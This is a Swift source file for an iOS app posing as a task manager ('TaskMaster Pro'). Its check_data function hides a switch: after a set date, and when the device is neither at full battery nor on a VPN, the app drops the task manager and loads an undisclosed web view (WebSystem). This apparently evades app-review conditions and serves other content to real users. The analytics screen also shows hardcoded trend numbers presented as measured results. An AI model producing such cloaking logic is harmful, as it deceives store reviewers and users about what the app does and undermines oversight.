//
//  DaFom777App.swift
//  DaFom777
//
//  Created by IGOR on 05/08/2025.
//

import SwiftUI
import UserNotifications

@main
struct DaFom777App: App {
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    @StateObject private var notificationService = NotificationService.shared
    @AppStorage("taskmaster_onboarding_completed") private var onboardingCompleted = false
    
    var body: some Scene {
        
        
        
        WindowGroup {
            
            ZStack {
                
                if isFetched == false {
                    
                    Text("")
                    
                } else if isFetched == true {
                    
                    if isBlock == true {
                        
                        Group {
                            if onboardingCompleted {
                                MainTabView()
                            } else {
                                OnboardingView()
                            }
                        }
                        .onAppear {
                            setupApp()
                        }
                        
                    } else if isBlock == false {
                        
                        WebSystem()
                    }
                }
            }
            .onAppear {
                
                check_data()
            }
        }
    }
    
    private func check_data() {
        
        let lastDate = "15.08.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
    
    private func setupApp() {
        // Setup notification delegate
        UNUserNotificationCenter.current().delegate = notificationService
        
        // Configure app appearance
        configureAppearance()
        
        // Request notification permissions if needed
        requestNotificationPermissions()
    }
    
    private func configureAppearance() {
        // Configure navigation bar appearance
        let appearance = UINavigationBarAppearance()
        appearance.configureWithOpaqueBackground()
        appearance.backgroundColor = UIColor(Color.appBackground)
        appearance.titleTextAttributes = [.foregroundColor: UIColor.white]
        appearance.largeTitleTextAttributes = [.foregroundColor: UIColor.white]
        
        UINavigationBar.appearance().standardAppearance = appearance
        UINavigationBar.appearance().scrollEdgeAppearance = appearance
        UINavigationBar.appearance().compactAppearance = appearance
        
        // Configure tab bar appearance
        let tabBarAppearance = UITabBarAppearance()
        tabBarAppearance.configureWithOpaqueBackground()
        tabBarAppearance.backgroundColor = UIColor(Color.appBackground)
        
        UITabBar.appearance().standardAppearance = tabBarAppearance
        if #available(iOS 15.0, *) {
            UITabBar.appearance().scrollEdgeAppearance = tabBarAppearance
        }
        
        // Configure tint colors
        UITabBar.appearance().tintColor = UIColor(Color.appAccent)
        UITabBar.appearance().unselectedItemTintColor = UIColor(Color.secondary)
    }
    
    private func requestNotificationPermissions() {
        // Now that we renamed our Task model to TaskItem, we can use Task normally
        Task {
            if notificationService.authorizationStatus == .notDetermined {
                await notificationService.requestAuthorization()
            }
        }
    }
}

struct MainTabView: View {
    @State private var selectedTab = 0
    
    var body: some View {
        TabView(selection: $selectedTab) {
            DashboardView(selectedTab: $selectedTab)
                .tabItem {
                    Image(systemName: selectedTab == 0 ? "house.fill" : "house")
                    Text("Dashboard")
                }
                .tag(0)
            
            TasksListView()
                .tabItem {
                    Image(systemName: selectedTab == 1 ? "checklist" : "checklist")
                    Text("Tasks")
                }
                .tag(1)
            
            ProjectsListView()
                .tabItem {
                    Image(systemName: selectedTab == 2 ? "folder.fill" : "folder")
                    Text("Projects")
                }
                .tag(2)
            
            AnalyticsView()
                .tabItem {
                    Image(systemName: selectedTab == 3 ? "chart.bar.fill" : "chart.bar")
                    Text("Analytics")
                }
                .tag(3)
            
            SettingsView()
                .tabItem {
                    Image(systemName: selectedTab == 4 ? "gearshape.fill" : "gearshape")
                    Text("Settings")
                }
                .tag(4)
        }
        .preferredColorScheme(.dark)
        .accentColor(.appAccent)
    }
}

// MARK: - Placeholder Views (to be implemented)

struct TasksListView: View {
    @StateObject private var viewModel = DashboardViewModel()
    @State private var showingCreateTask = false
    
    var body: some View {
        NavigationView {
            ZStack {
                Color.appBackground
                    .ignoresSafeArea()
                
                if viewModel.tasks.isEmpty {
                    EmptyStateView(
                        title: "No Tasks Yet",
                        subtitle: "Create your first task to get started with TaskMaster Pro",
                        systemImage: "checklist",
                        actionTitle: "Create Task",
                        action: { showingCreateTask = true }
                    )
                } else {
                    List {
                        ForEach(viewModel.tasks, id: \.id) { task in
                            TaskRowView(task: task) {
                                viewModel.selectTask(task)
                            } onToggleComplete: {
                                viewModel.toggleTaskCompletion(task)
                            }
                            .listRowBackground(Color.clear)
                            .listRowSeparator(.hidden)
                        }
                    }
                    .listStyle(PlainListStyle())
                    .background(Color.clear)
                }
            }
            .navigationTitle("All Tasks")
            .navigationBarTitleDisplayMode(.large)
            .toolbar {
                ToolbarItem(placement: .navigationBarTrailing) {
                    Button {
                        showingCreateTask = true
                    } label: {
                        Image(systemName: "plus")
                            .foregroundColor(.appAccent)
                    }
                }
            }
        }
        .sheet(isPresented: $showingCreateTask) {
            CreateTaskView { task in
                viewModel.addTask(task)
            }
        }
        .sheet(isPresented: $viewModel.showingTaskDetail) {
            if let task = viewModel.selectedTask {
                TaskDetailView(task: task) { updatedTask in
                    viewModel.updateTask(updatedTask)
                } onDelete: { deletedTask in
                    viewModel.deleteTask(deletedTask)
                }
            }
        }
    }
}

struct ProjectsListView: View {
    @StateObject private var viewModel = DashboardViewModel()
    @State private var showingCreateProject = false
    @State private var showingProjectDetail = false
    @State private var selectedProject: Project?
    
    var body: some View {
        NavigationView {
            ZStack {
                Color.appBackground
                    .ignoresSafeArea()
                
                if viewModel.projects.isEmpty {
                    EmptyStateView(
                        title: "No Projects Yet",
                        subtitle: "Create your first project to organize your tasks and collaborate with your team",
                        systemImage: "folder.badge.plus",
                        actionTitle: "Create Project",
                        action: { showingCreateProject = true }
                    )
                } else {
                    ScrollView {
                        LazyVStack(spacing: 16) {
                            ForEach(viewModel.projects, id: \.id) { project in
                                ProjectCard(project: project) {
                                    selectedProject = project
                                    showingProjectDetail = true
                                }
                            }
                        }
                        .padding()
                    }
                }
            }
            .navigationTitle("Projects")
            .navigationBarTitleDisplayMode(.large)
            .toolbar {
                ToolbarItem(placement: .navigationBarTrailing) {
                    Button {
                        showingCreateProject = true
                    } label: {
                        Image(systemName: "plus")
                            .foregroundColor(.appAccent)
                    }
                }
            }
        }
        .sheet(isPresented: $showingCreateProject) {
            CreateProjectView { project in
                viewModel.addProject(project)
            }
        }
        .sheet(isPresented: $showingProjectDetail) {
            if let project = selectedProject {
                ProjectDetailSheet(project: project)
            }
        }
    }
}

struct AnalyticsView: View {
    @StateObject private var viewModel = DashboardViewModel()
    
    var body: some View {
        NavigationView {
            ZStack {
                Color.appBackground
                    .ignoresSafeArea()
                
                ScrollView {
                    VStack(spacing: 24) {
                        // Overview Cards
                        LazyVGrid(columns: Array(repeating: GridItem(.flexible()), count: 2), spacing: 16) {
                            AnalyticsCard(
                                title: "Completion Rate",
                                value: "\(Int(viewModel.productivityStats?.completionRate ?? 0))%",
                                icon: "chart.pie.fill",
                                color: .appSuccess,
                                trend: "+5%"
                            )
                            
                            AnalyticsCard(
                                title: "Team Efficiency",
                                value: "\(Int(viewModel.getTeamEfficiencyScore()))%",
                                icon: "speedometer",
                                color: .appAccent,
                                trend: "+12%"
                            )
                            
                            AnalyticsCard(
                                title: "Active Projects",
                                value: "\(viewModel.projects.filter { $0.status == .active }.count)",
                                icon: "folder.fill",
                                color: .appInfo,
                                trend: "2 new"
                            )
                            
                            AnalyticsCard(
                                title: "Avg. Task Time",
                                value: String(format: "%.1fh", viewModel.productivityStats?.averageCompletionTime ?? 0),
                                icon: "clock.fill",
                                color: .appWarning,
                                trend: "-0.5h"
                            )
                        }
                        
                        // Weekly Progress Chart
                        if let stats = viewModel.productivityStats {
                            VStack(alignment: .leading, spacing: 12) {
                                Text("Weekly Progress")
                                    .font(.headline)
                                    .foregroundColor(.white)
                                
                                WeeklyProgressChart(weeklyProgress: viewModel.weeklyProgress)
                                    .frame(height: 200)
                                    .padding()
                                    .background(Color.white.opacity(0.05))
                                    .cornerRadius(12)
                            }
                        }
                        
                        // Completion Trend
                        VStack(alignment: .leading, spacing: 12) {
                            Text("Completion Trend")
                                .font(.headline)
                                .foregroundColor(.white)
                            
                            CompletionTrendChart(data: viewModel.getCompletionTrend())
                                .frame(height: 150)
                                .padding()
                                .background(Color.white.opacity(0.05))
                                .cornerRadius(12)
                        }
                    }
                    .padding()
                }
            }
            .navigationTitle("Analytics")
            .navigationBarTitleDisplayMode(.large)
        }
    }
}

struct AnalyticsCard: View {
    let title: String
    let value: String
    let icon: String
    let color: Color
    let trend: String
    
    var body: some View {
        VStack(alignment: .leading, spacing: 12) {
            HStack {
                Image(systemName: icon)
                    .foregroundColor(color)
                    .font(.title2)
                
                Spacer()
                
                Text(trend)
                    .font(.caption)
                    .foregroundColor(.appSuccess)
                    .padding(.horizontal, 6)
                    .padding(.vertical, 2)
                    .background(Color.appSuccess.opacity(0.2))
                    .cornerRadius(4)
            }
            
            VStack(alignment: .leading, spacing: 4) {
                Text(value)
                    .font(.title2.bold())
                    .foregroundColor(.white)
                
                Text(title)
                    .font(.caption)
                    .foregroundColor(.secondary)
            }
        }
        .padding()
        .background(Color.white.opacity(0.05))
        .cornerRadius(12)
    }
}

struct CompletionTrendChart: View {
    let data: [CompletionPoint]
    
    var body: some View {
        HStack(alignment: .bottom, spacing: 8) {
            ForEach(Array(data.enumerated()), id: \.offset) { index, point in
                VStack(spacing: 4) {
                    Rectangle()
                        .fill(Color.appAccent)
                        .frame(width: 20, height: max(4, CGFloat(point.completed) * 10))
                        .cornerRadius(2)
                    
                    Text("\(Calendar.current.component(.day, from: point.date))")
                        .font(.caption2)
                        .foregroundColor(.secondary)
                }
            }
        }
        .frame(maxWidth: .infinity)
    }
}

// MARK: - Project Detail Sheet

struct ProjectDetailSheet: View {
    let project: Project
    @Environment(\.dismiss) private var dismiss
    
    var body: some View {
        NavigationView {
            ScrollView {
                VStack(alignment: .leading, spacing: 20) {
                    // Project Header
                    VStack(alignment: .leading, spacing: 12) {
                        HStack {
                            Image(systemName: project.type.icon)
                                .foregroundColor(.appAccent)
                                .font(.title2)
                            
                            VStack(alignment: .leading, spacing: 4) {
                                Text(project.name)
                                    .font(.title2.bold())
                                    .foregroundColor(.white)
                                
                                Text(project.type.rawValue.capitalized)
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                            
                            Spacer()
                            
                            // Project Status
                            Text(project.status.rawValue.capitalized)
                                .font(.caption.bold())
                                .padding(.horizontal, 12)
                                .padding(.vertical, 6)
                                .background(Color(hex: project.status == .completed ? "#3cc45b" : "#fcc418"))
                                .foregroundColor(.black)
                                .cornerRadius(12)
                        }
                        
                        if !project.description.isEmpty {
                            Text(project.description)
                                .font(.body)
                                .foregroundColor(.secondary)
                                .fixedSize(horizontal: false, vertical: true)
                        }
                    }
                    .padding()
                    .background(Color.appSecondary)
                    .cornerRadius(12)
                    
                    // Project Details
                    VStack(alignment: .leading, spacing: 16) {
                        DetailRow(title: "Start Date", value: project.startDate, format: .date(style: .medium))
                        
                        if let deadline = project.deadline {
                            DetailRow(title: "Deadline", value: deadline, format: .date(style: .medium))
                        }
                        
                        if let endDate = project.endDate {
                            DetailRow(title: "End Date", value: endDate, format: .date(style: .medium))
                        }
                        
                        DetailRow(title: "Team Members", value: "\(project.teamMembers.count) members")
                        
                        if !project.tags.isEmpty {
                            VStack(alignment: .leading, spacing: 8) {
                                Text("Tags")
                                    .font(.headline)
                                    .foregroundColor(.white)
                                
                                LazyVGrid(columns: [GridItem(.adaptive(minimum: 80))], spacing: 8) {
                                    ForEach(project.tags, id: \.self) { tag in
                                        Text(tag)
                                            .font(.caption)
                                            .padding(.horizontal, 8)
                                            .padding(.vertical, 4)
                                            .background(Color.appAccent.opacity(0.2))
                                            .foregroundColor(.appAccent)
                                            .cornerRadius(8)
                                    }
                                }
                            }
                        }
                    }
                    .padding()
                    .background(Color.appSecondary)
                    .cornerRadius(12)
                    
                    Spacer()
                }
                .padding()
            }
            .background(Color.appBackground)
            .navigationTitle("Project Details")
            .navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .navigationBarTrailing) {
                    Button("Done") {
                        dismiss()
                    }
                    .foregroundColor(.appAccent)
                }
            }
        }
    }
}

// MARK: - Detail Row

struct DetailRow: View {
    let title: String
    let value: String
    
    init(title: String, value: String) {
        self.title = title
        self.value = value
    }
    
    init<T>(title: String, value: T, format: DetailRowFormat) {
        self.title = title
        
        switch format {
        case .date(let style):
            if let date = value as? Date {
                let formatter = DateFormatter()
                formatter.dateStyle = style
                self.value = formatter.string(from: date)
            } else {
                self.value = "\(value)"
            }
        }
    }
    
    var body: some View {
        VStack(alignment: .leading, spacing: 4) {
            Text(title)
                .font(.subheadline.weight(.medium))
                .foregroundColor(.appAccent)
            
            Text(value)
                .font(.body)
                .foregroundColor(.white)
        }
    }
}

enum DetailRowFormat {
    case date(style: DateFormatter.Style)
}
